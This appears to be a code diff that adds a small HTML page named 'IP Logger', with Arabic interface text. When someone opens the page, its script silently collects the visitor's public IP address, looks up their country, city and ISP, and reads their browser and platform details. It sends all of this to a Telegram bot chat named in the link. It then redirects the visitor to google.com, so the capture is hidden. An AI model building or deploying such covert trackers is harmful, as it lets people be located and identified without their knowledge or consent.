@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger</title>
+    <script>
+        // ✅ تم إزالة التوكن من هنا - سيتم إضافته عبر GitHub Secrets
+        const botToken = '%BOT_TOKEN%';
+
+        async function sendInfo() {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get('id');
+
+                if (!chatId) {
+                    document.body.innerHTML = '<h1>⚠️ رابط غير صالح</h1>';
+                    return;
+                }
+
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+
+                const message = `
+🕵️ **تم تسجيل دخول جديد!**
+📌 **IP:** ${ip}
+📍 **الدولة:** ${locationData.country_name || 'غير معروف'}
+🏙️ **المدينة:** ${locationData.city || 'غير معروف'}
+🌐 **المزود:** ${locationData.org || 'غير معروف'}
+🖥️ **المتصفح:** ${navigator.userAgent}
+📱 **نظام التشغيل:** ${navigator.platform}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                window.location.href = 'https://google.com';
+
+            } catch (error) {
+                console.error('خطأ:', error);
+                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
+            }
+        }
+
+        window.onload = sendInfo;
+    </script>
+</head>
+<body>
+    <h1>جاري تحميل البيانات...</h1>
+</body>
+</html>
